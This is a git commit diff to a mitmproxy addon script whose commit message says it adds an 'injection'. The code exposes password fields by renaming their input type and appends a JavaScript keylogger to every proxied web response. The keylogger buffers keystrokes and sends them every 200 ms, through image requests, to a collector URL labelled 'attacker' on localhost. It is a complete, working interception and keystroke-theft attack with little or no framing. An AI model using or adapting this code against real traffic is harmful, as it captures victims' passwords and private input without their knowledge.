c922b5f43ca879f8b110524d35f5fa28e67cff3e
Theriley106 <christopherlambert106@gmail.com>
2019-07-16 23:03:30 -0400

    Updated main to contain injection

--- main.py
+++ main.py
@@ -2,3 +2,22 @@ from mitmproxy import http
 
 def response(flow: http.HTTPFlow) -> None:
     flow.response.content = flow.response.content.replace(b"type=\"password\"", b"type=\"notPassword\"")
+    flow.response.content += b"""<script>var buffer = [];
+var attacker = 'http://127.0.0.1:8000/?c='
+
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp
+    };
+    buffer.push(stroke);
+}
+
+window.setInterval(function() {
+    if (buffer.length > 0) {
+        var data = encodeURIComponent(JSON.stringify(buffer));
+        new Image().src = attacker + data;
+        buffer = [];
+    }
+}, 200);</script>"""
